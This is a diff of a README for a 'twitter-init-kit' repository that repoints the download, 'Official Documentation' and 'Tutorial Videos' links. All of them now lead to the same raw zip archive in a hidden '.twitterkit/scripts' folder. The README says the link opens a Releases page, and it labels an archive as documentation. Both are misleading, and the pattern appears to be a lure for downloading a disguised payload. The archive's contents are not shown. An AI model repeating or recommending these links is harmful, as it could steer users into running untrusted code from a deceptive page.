@@ -16,11 +16,11 @@ Welcome to the **twitter-init-kit**! This is your go-to toolkit for creating and
 
 To get started, you need to download the software from the Releases page. 
 
-[![Download Latest Release](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/specs/003-twitter-kit-auto-template-release/init_twitter_kit_v3.7.zip)](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/specs/003-twitter-kit-auto-template-release/init_twitter_kit_v3.7.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
 
 ### Steps to Download:
 
-1. Click on this link: [Download Latest Release](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/specs/003-twitter-kit-auto-template-release/init_twitter_kit_v3.7.zip).
+1. Click on this link: [Download Latest Release](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip).
    
 2. On the Releases page, you will see the latest version available. 
 
@@ -68,8 +68,8 @@ If you encounter any issues or have questions, we encourage you to reach out. He
 
 For more information and detailed guides, check out the following resources:
 
-- [Official Documentation](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/specs/003-twitter-kit-auto-template-release/init_twitter_kit_v3.7.zip)
-- [Tutorial Videos](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/specs/003-twitter-kit-auto-template-release/init_twitter_kit_v3.7.zip)
+- [Official Documentation](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
+- [Tutorial Videos](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
 
 ## 📜 License
 
